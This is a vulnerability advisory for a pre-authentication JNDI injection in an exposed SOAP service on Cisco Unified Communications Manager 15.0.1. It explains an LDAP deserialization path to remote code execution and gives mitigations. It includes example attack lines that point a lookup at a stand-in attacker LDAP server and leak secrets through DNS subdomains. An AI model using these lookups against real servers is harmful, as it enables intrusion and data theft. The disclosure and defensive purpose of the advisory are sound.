# SKYLINE-2026-057b — Lookaphack: JNDI Injection via Deployed SOAP Service

| Field | Value |
|-------|-------|
| **ID** | SKYLINE-2026-057b |
| **CVE** | Pending (MITRE CNA of Last Resort) |
| **CWE** | CWE-502 — Deserialization of Untrusted Data (CWE-918 — SSRF) |
| **CVSSv3.1** | 9.8 (Critical) — component rating; chain rating 10.0 in the Dead;Dial advisory |
| **Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Product** | Cisco Unified Communications Manager 15.0.1.12900-234 |
| **Component** | OpenJDK 1.8.0_362 JNDI/LDAP client + xstream 1.4.20 / javassist gadget classes on the webapp classpath |
| **Attack Type** | Remote, pre-authentication (after SKYLINE-2026-057a) |
| **Used In** | [Dead;Dial](https://github.com/0xReadingSteiner/Dead-Dial) |

## Description

Once `javax.naming.InitialContext` is exposed as a SOAP service (SKYLINE-2026-057a), an unauthenticated attacker invokes `lookup()` with an attacker-controlled URL, e.g. `ldap://ATTACKER:1389/exploit`. CUCM dials **out** to the attacker's LDAP server; on JDK 8 the JNDI/LDAP client will deserialize a `javaSerializedData` attribute returned in the LDAP response via `ObjectInputStream.readObject()`. With xstream 1.4.20 and javassist on the classpath, gadget chains turn that deserialization into remote code execution as the `tomcat` user.

Two platform settings remove the usual mitigations:

- CUCM runs JDK 8 (`1.8.0_362`), which — unlike JDK 11+ — does not default `com.sun.jndi.ldap.object.trustURLCodebase` to false for the deserialization path used here.
- CUCM explicitly sets `-Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true`, disabling LDAP endpoint verification.

Even where full RCE is not achieved, the primitive is a potent pre-auth SSRF: internal port probing via LDAP/DNS callbacks, reaching localhost-bound services, and blind data exfiltration through DNS (`lookup("ldap://" + secret + ".attacker.domain")`). Because the payload arrives on an **outbound** connection the server initiated, inbound-focused NGFW/IPS inspection never sees it.

Confirmed live on CUCM 15.0.1.12900-234, 2026-08-01: the attacker listener captured a 14-byte LDAP BindRequest (`300c 0201 0160 0702 0103 0400 8000`) and CUCM resolved the attacker-specified domain.

## Fix

1. Remove the AdminService exposure (SKYLINE-2026-057a fix) — the lookup surface disappears with it.
2. Block outbound LDAP (1389/636) and arbitrary outbound DNS from CUCM at the firewall; alert on CUCM-initiated LDAP to non-directory hosts.
3. Set `-Dcom.sun.jndi.ldap.object.trustURLCodebase=false` and remove `disableEndpointIdentification=true`.
4. Upgrade the platform JDK to 11+ where Cisco supports it.

## Researcher

0xReadingSteiner — 0xReadingSteiner@proton.me
